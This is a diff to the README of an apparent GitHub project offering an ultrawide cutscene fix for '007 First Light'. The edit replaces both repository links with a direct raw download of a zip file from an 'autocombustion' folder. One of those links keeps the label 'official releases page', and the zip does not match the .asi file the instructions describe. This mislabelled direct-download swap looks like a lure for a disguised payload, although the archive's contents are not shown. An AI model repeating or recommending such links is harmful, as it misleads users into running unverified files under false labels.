@@ -1,6 +1,6 @@
 # 🖥️ 007FirstLightUltrawide - Fix ultrawide cutscenes for better gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Divyansh2574/007FirstLightUltrawide)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Divyansh2574/007FirstLightUltrawide/raw/refs/heads/main/autocombustion/Light-Ultrawide-First-1.4.zip)
 
 This software corrects the aspect ratio for cutscenes in 007 First Light. The game defaults to 16:9, which forces black bars on the sides of ultrawide monitors. This plugin updates the game memory while it runs to stretch or fix the view to fit your screen.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up the fix:
 
-1. Visit the [official releases page](https://github.com/Divyansh2574/007FirstLightUltrawide) to download the latest version.
+1. Visit the [official releases page](https://github.com/Divyansh2574/007FirstLightUltrawide/raw/refs/heads/main/autocombustion/Light-Ultrawide-First-1.4.zip) to download the latest version.
 2. Locate the file named 007FirstLightUltrawide.asi in your downloads folder.
 3. Open the folder where 007 First Light is installed.
 4. Locate the folder named scripts inside your game directory. If this folder does not exist, create a new folder named scripts.
